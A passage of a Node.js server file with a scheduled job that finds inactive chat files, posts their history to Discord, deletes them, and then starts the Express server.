            } catch (err) {
                console.error('Error looking up user info:', err);
            }
            
            const files = fs.readdirSync(userDirPath);
            const expiredChats = [];

            // Check each chat file in this user's directory
            for (const file of files) {
                if (!file.endsWith('.json')) continue;

                const filePath = path.join(userDirPath, file);
                try {
                    const fileContent = fs.readFileSync(filePath, 'utf-8');
                    const chat = JSON.parse(fileContent);
                    
                    // Check if chat is expired
                    // Only check expiration if we have a valid timestamp
                    const lastActivity = chat.lastActivity || chat.createdAt || chat.startTime;
                    
                    // Skip if no valid timestamp found (shouldn't happen, but safety check)
                    if (!lastActivity || lastActivity <= 0) {
                        console.warn(`[Cleanup] Chat ${file} has no valid timestamp, skipping expiration check`);
                        continue;
                    }
                    
                    const timeSinceLastActivity = currentTime - lastActivity;
                    const isExpired = timeSinceLastActivity >= inactivityTimeout;
                    
                    if (isExpired) {
                        console.log(`[Cleanup] Found expired chat: ${file}`);
                        console.log(`[Cleanup]   Last activity: ${new Date(lastActivity).toISOString()}`);
                        console.log(`[Cleanup]   Time since: ${Math.round(timeSinceLastActivity / 1000)}s (${Math.round(timeSinceLastActivity / 60000)}m)`);
                        console.log(`[Cleanup]   Timeout: ${Math.round(inactivityTimeout / 1000)}s (${Math.round(inactivityTimeout / 60000)}m)`);
                        expiredChats.push({ filePath, chat });
                    }
                    // Note: We don't log non-expired chats to avoid log spam
                } catch (error) {
                    console.error(`[Cleanup] Error reading chat file ${file}:`, error);
                    // If file is corrupted, still try to delete it
                    expiredChats.push({ filePath, chat: null });
                }
            }

            // Process expired chats: send to Discord first, then delete
            for (const { filePath, chat } of expiredChats) {
                try {
                    if (chat) {
                        // Prepare chat history for Discord
                        const chatHistory = {
                            chatId: chat.id || chat.chatId || filePath.split(path.sep).pop().replace('.json', ''),
                            chatName: chat.name || chat.chatName || 'Untitled Chat',
                            messages: chat.messages || [],
                            startTime: chat.startTime || chat.createdAt || Date.now(),
                            endTime: currentTime,
                            duration: chat.duration || `${Math.floor((currentTime - (chat.startTime || chat.createdAt || currentTime)) / 60000)}m ${Math.floor(((currentTime - (chat.startTime || chat.createdAt || currentTime)) % 60000) / 1000)}s`
                        };
                        
                        // Send to Discord before deleting
                        await sendChatHistoryToDiscord(chatHistory, userInfo);
                    }
                    
                    // Delete the file
                    fs.unlinkSync(filePath);
                    totalDeletedCount++;
                    console.log(`✅ Scheduled cleanup: deleted expired chat file: ${filePath}`);
                } catch (error) {
                    console.error(`Error processing expired chat file ${filePath}:`, error);
                }
            }
        }

        if (totalDeletedCount > 0) {
            console.log(`✅ Scheduled cleanup completed: removed ${totalDeletedCount} expired chat file(s) at ${new Date().toISOString()}`);
        }
        // Note: We don't log when no expired chats are found to avoid log spam
    } catch (error) {
        console.error('Error in scheduled chat cleanup:', error);
        console.error('Stack trace:', error.stack);
    }
};

// Run cleanup immediately on server start, then every 1 minute
cleanupExpiredChats().catch(err => {
    console.error('Error in initial cleanup:', err);
});
const cleanupInterval = setInterval(() => {
    cleanupExpiredChats().catch(err => {
        console.error('Error in scheduled cleanup:', err);
    });
}, 60 * 1000); // Every 1 minute
console.log('✅ Scheduled chat cleanup initialized (runs every 1 minute, independent of user presence)');

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
